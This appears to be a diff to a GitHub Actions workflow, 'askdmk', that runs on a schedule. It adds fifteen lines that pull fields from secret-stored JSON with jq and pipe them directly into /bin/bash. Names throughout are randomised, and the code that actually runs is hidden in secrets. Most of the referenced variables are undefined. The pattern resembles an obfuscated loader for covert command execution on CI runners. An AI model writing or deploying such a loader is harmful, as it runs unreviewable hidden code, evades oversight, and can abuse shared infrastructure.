@@ -3,8 +3,7 @@ name: askdmk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
-
+    - cron: '0 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: askdmk
         env:
-          po9958: ${{ secrets.po9958 }}
+          l60: ${{ secrets.l60 }}
         run: |
-          echo $po9958 | jq -r .ni69 | /bin/bash
-          echo $pe7503 | jq -r .e4 | /bin/bash
-          echo $z5218 | jq -r .wok788 | /bin/bash
-          echo $v6735 | jq -r .l6 | /bin/bash
-          echo $wgarj49138 | jq -r .vkrq7 | /bin/bash
-          echo $tbr8 | jq -r .xyo56 | /bin/bash
-          echo $pvh9 | jq -r .qhuam61986 | /bin/bash
+          echo $l60 | jq -r .yaly585 | /bin/bash
+          echo $rcb03088 | jq -r .ww408 | /bin/bash
+          echo $k15 | jq -r .t097 | /bin/bash
+          echo $lhvp8 | jq -r .hmc81220 | /bin/bash
+          echo $ttg985 | jq -r .a19 | /bin/bash
+          echo $oe034 | jq -r .tnw7690 | /bin/bash
+          echo $g5 | jq -r .ocbs23269 | /bin/bash
+          echo $vgsn07630 | jq -r .yxret0047 | /bin/bash
+          echo $qqp0383 | jq -r .lslh444 | /bin/bash
+          echo $bwf7 | jq -r .ovyzv8 | /bin/bash
+          echo $de60878 | jq -r .is5763 | /bin/bash
+          echo $ajmg10057 | jq -r .skkyk1 | /bin/bash
+          echo $kcim0 | jq -r .tiz22 | /bin/bash
+          echo $mltge42 | jq -r .zkven9 | /bin/bash
+          echo $ubt9 | jq -r .vzc3 | /bin/bash
 
